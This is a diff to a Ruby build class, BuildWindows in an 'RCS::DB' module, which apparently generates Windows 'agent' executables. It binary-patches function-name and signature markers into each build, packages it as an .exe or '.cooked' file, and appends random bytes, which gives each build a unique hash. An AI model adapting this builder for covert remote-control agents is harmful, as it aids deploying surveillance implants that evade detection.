@@ -4,6 +4,7 @@
 
 # from RCS::Common
 require 'rcs-common/trace'
+require 'rcs-common/binary'
 
 module RCS
 module DB
@@ -41,7 +42,7 @@ class BuildWindows < Build
     content = file.read
 
     begin
-      content.gsub! 'PFTBBP', @funcname
+      content.binary_patch 'PFTBBP', @funcname
     rescue
       raise "Funcname marker not found"
     end
@@ -58,13 +59,13 @@ class BuildWindows < Build
     begin
       sign = ::Signature.where({scope: 'agent'}).first
       signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-      content.gsub! 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
+      content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
     rescue
       raise "Signature marker not found"
     end
 
     begin
-      content.gsub! 'PFTBBP', @funcname
+      content.binary_patch 'PFTBBP', @funcname
     rescue
       raise "Funcname marker not found"
     end
@@ -173,7 +174,7 @@ class BuildWindows < Build
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open(@appname + (@cooked ? '.cooked' : '.exe'), "w") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
+      z.file.open(@appname + (@cooked ? '.cooked' : '.exe'), "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
@@ -181,9 +182,8 @@ class BuildWindows < Build
 
   end
 
-
   def add_random(file)
-    File.open(file, 'a+') {|f| f.write SecureRandom.random_bytes(16)}
+    File.open(file, 'ab+') {|f| f.write SecureRandom.random_bytes(16)}
   end
 
 end
